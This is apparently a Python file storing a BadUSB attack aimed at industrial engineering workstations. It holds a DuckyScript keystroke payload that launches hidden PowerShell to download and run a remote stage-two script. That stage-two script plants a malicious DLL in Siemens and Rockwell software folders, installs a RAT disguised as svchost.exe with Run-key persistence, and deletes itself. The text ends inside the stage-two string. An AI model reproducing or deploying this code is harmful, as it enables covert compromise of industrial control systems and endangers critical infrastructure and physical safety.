# badusb_industrial.py - Automated infection via USB
# Deploy on Rubber Ducky, Bash Bunny, or DigiSpark

"""
Scenario: Contractor brings infected USB to site
USB device emulates keyboard, types malicious commands
Infects air-gapped engineering workstation
"""

# Rubber Ducky payload (DuckyScript)
DUCKY_PAYLOAD = """
REM Auto-infection script for EWS
DELAY 2000
GUI r
DELAY 500
STRING powershell -NoP -NonI -W Hidden -Exec Bypass
ENTER
DELAY 1000
STRING IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.100/stage2.ps1')
ENTER
"""

# Stage 2 PowerShell (hosted on USB mass storage partition)
STAGE2_PS = """
# Enumerate ICS software
$ics_apps = @(
    "C:\\Program Files\\Siemens",
    "C:\\Program Files (x86)\\Rockwell Software"
)

foreach ($app in $ics_apps) {
    if (Test-Path $app) {
        # Inject DLL into application directory
        Copy-Item "E:\\payload.dll" "$app\\malicious.dll"
    }
}

# Establish persistence
$payload = "E:\\rat.exe"
Copy-Item $payload "C:\\Windows\\Temp\\svchost.exe"
New-ItemProperty -Path "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" -Name "Update" -Value "C:\\Windows\\Temp\\svchost.exe"

# Self-delete
Remove-Item $MyInvocation.MyCommand.Source
